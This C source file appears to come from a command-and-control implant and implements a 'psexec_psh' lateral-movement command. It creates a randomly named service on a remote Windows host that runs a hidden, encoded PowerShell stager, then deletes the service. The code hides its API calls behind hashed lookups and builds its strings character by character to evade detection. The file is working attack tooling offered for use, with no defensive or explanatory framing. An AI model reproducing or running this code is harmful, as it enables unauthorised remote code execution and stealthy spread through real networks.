#include "config.h"
#ifdef INCLUDE_CMD_PSEXEC_PSH

#include "commands.h"
#include "common.h"

// psexec_psh <host> <listener-url>: classic CS psexec_psh - no binary is
// dropped. A remote service with a random 8-char name runs
//   %COMSPEC% /b /c powershell -nop -w hidden -e <b64 PS fetch/stager>
// The base64 (UTF-16LE, standard -e encoding) is produced in psexec_psh.py.
// Uses the current thread token for SMB/SCM access (make_token supported).

typedef SC_HANDLE (WINAPI *fn_OpenSCManagerW)(LPCWSTR, LPCWSTR, DWORD);
typedef SC_HANDLE (WINAPI *fn_CreateServiceW)(SC_HANDLE, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
typedef BOOL      (WINAPI *fn_StartServiceW)(SC_HANDLE, DWORD, LPCWSTR*);
typedef BOOL      (WINAPI *fn_DeleteService)(SC_HANDLE);
typedef BOOL      (WINAPI *fn_CloseServiceHandle)(SC_HANDLE);

static DWORD _es_psh_rand_seed = 0;
static DWORD _es_psh_rand(PINSTANCE inst) {
    if (!_es_psh_rand_seed) {
        _es_psh_rand_seed = (DWORD)(SIZE_T)inst ^ inst->Win32.GetCurrentProcessId() ^ 0x85EBCA6B;
    }
    _es_psh_rand_seed ^= _es_psh_rand_seed << 13;
    _es_psh_rand_seed ^= _es_psh_rand_seed >> 17;
    _es_psh_rand_seed ^= _es_psh_rand_seed << 5;
    return _es_psh_rand_seed;
}

VOID cmd_psexec_psh(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD host_len = 0, enc_len = 0;
    char* host = parser_string(args, &host_len);
    char* enc_cmd = parser_string(args, &enc_len);

    if (!host || host_len == 0) {
        package_add_string(inst, response, XSTR("No hostname provided"));
        response->is_error = TRUE;
        return;
    }
    if (!enc_cmd || enc_len == 0) {
        package_add_string(inst, response, XSTR("No encoded PowerShell command provided"));
        response->is_error = TRUE;
        return;
    }

    char hostbuf[256] = {0};
    es_memcpy(hostbuf, host, host_len < 255 ? host_len : 255);

    static const char alphabet[] = {
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
        'q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5'
    };
    char rnd[9] = {0};
    for (int i = 0; i < 8; i++) rnd[i] = alphabet[_es_psh_rand(inst) & 31];

    // service binPath: %COMSPEC% /b /c powershell -nop -w hidden -e <b64>
    // (%COMSPEC% is expanded by SCM when creating the process)
    // heap-allocate the wide binPath: a 4KB wchar_t stack frame trips clang's
    // x86 _alloca stack probe, which is unresolved in -nostdlib builds
    DWORD w_bin_cap = (enc_len + 128) * sizeof(wchar_t);
    wchar_t* w_bin = (wchar_t*)es_malloc(inst, w_bin_cap);
    if (!w_bin) {
        package_add_string(inst, response, XSTR("alloc failed"));
        response->is_error = TRUE;
        return;
    }
    static const char prefix[] =
        {'%','C','O','M','S','P','E','C','%',' ','/','b',' ','/','c',' ',
         'p','o','w','e','r','s','h','e','l','l',' ','-','n','o','p',' ',
         '-','w',' ','h','i','d','d','e','n',' ','-','e',' ',0};
    DWORD b = 0;
    for (int i = 0; prefix[i]; i++) w_bin[b++] = (wchar_t)prefix[i];
    for (DWORD i = 0; enc_cmd[i] && b < w_bin_cap / sizeof(wchar_t) - 2; i++) w_bin[b++] = (wchar_t)enc_cmd[i];
    w_bin[b] = 0;

    // resolve SCM APIs from advapi32 (loaded at init; LoadLibraryA fallback)
    PVOID advapi = inst->Modules.Advapi32;
    if (!advapi) advapi = (PVOID)inst->Win32.LoadLibraryA(XSTR("advapi32.dll"));
    if (!advapi) {
        package_add_string(inst, response, XSTR("Failed to load advapi32"));
        response->is_error = TRUE;
        return;
    }

    fn_OpenSCManagerW      pOpenSCManagerW = (fn_OpenSCManagerW)resolve_function(advapi, hash_string_djb2(XSTR("OpenSCManagerW")));
    fn_CreateServiceW      pCreateServiceW = (fn_CreateServiceW)resolve_function(advapi, hash_string_djb2(XSTR("CreateServiceW")));
    fn_StartServiceW       pStartServiceW  = (fn_StartServiceW)resolve_function(advapi, hash_string_djb2(XSTR("StartServiceW")));
    fn_DeleteService       pDeleteService  = (fn_DeleteService)resolve_function(advapi, hash_string_djb2(XSTR("DeleteService")));
    fn_CloseServiceHandle  pCloseSvcH      = (fn_CloseServiceHandle)resolve_function(advapi, hash_string_djb2(XSTR("CloseServiceHandle")));

    if (!pOpenSCManagerW || !pCreateServiceW || !pStartServiceW ||
        !pDeleteService || !pCloseSvcH) {
        package_add_string(inst, response, XSTR("Failed to resolve SCM APIs"));
        response->is_error = TRUE;
        return;
    }

    wchar_t w_unc_host[270] = {0};
    w_unc_host[0] = '\\'; w_unc_host[1] = '\\';
    for (DWORD i = 0; hostbuf[i] && i < 256; i++) w_unc_host[i + 2] = (wchar_t)hostbuf[i];

    wchar_t w_svc[16] = {0};
    for (int i = 0; rnd[i]; i++) w_svc[i] = (wchar_t)rnd[i];

    SC_HANDLE h_scm = pOpenSCManagerW(w_unc_host, NULL,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!h_scm) {
        package_add_string(inst, response,
            XSTR("OpenSCManagerW failed - check perms/network"));
        response->is_error = TRUE;
        return;
    }

    SC_HANDLE h_svc = pCreateServiceW(
        h_scm, w_svc, w_svc, SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        w_bin, NULL, NULL, NULL, NULL, NULL);
    if (!h_svc) {
        pCloseSvcH(h_scm);
        package_add_string(inst, response, XSTR("CreateServiceW failed"));
        response->is_error = TRUE;
        return;
    }

    BOOL started = pStartServiceW(h_svc, 0, NULL);
    DWORD start_err = started ? 0 : inst->Win32.GetLastError();

    es_free(inst, w_bin);

    // classic psexec_psh deletes the service right after start
    BOOL deleted = pDeleteService(h_svc);
    pCloseSvcH(h_svc);
    pCloseSvcH(h_scm);

    char out[256] = {0};
    DWORD p = 0;
    static const char ok1[] = {'p','s','e','x','e','c','_','p','s','h',' ',0};
    for (int i = 0; ok1[i]; i++) out[p++] = ok1[i];
    for (int i = 0; rnd[i]; i++) out[p++] = rnd[i];
    static const char ok2[] = {' ','o','n',' ',0};
    for (int i = 0; ok2[i] && p < 200; i++) out[p++] = ok2[i];
    for (DWORD i = 0; hostbuf[i] && p < 240; i++) out[p++] = hostbuf[i];
    out[p] = 0;

    if (started) {
        if (deleted) {
            static const char s2[] = {' ','(','s','e','r','v','i','c','e',' ','d','e','l','e','t','e','d',')',0};
            DWORD q = es_strlen(out);
            for (int i = 0; s2[i] && q < 250; i++) out[q++] = s2[i];
            out[q] = 0;
        }
        package_add_string(inst, response, out);
    } else if (start_err == 1053) {
        // %COMSPEC% /c never reports SERVICE_RUNNING to SCM in time; the
        // powershell process still launched
        package_add_string(inst, response, out);
        package_add_string(inst, response,
            XSTR("StartService timed out (1053) - expected for /c one-liners"));
    } else {
        static const char f[] = {' ','s','t','a','r','t',' ','f','a','i','l','e','d',0};
        DWORD q = es_strlen(out);
        for (int i = 0; f[i] && q < 250; i++) out[q++] = f[i];
        out[q] = 0;
        package_add_string(inst, response, out);
        response->is_error = TRUE;
    }
}

#endif
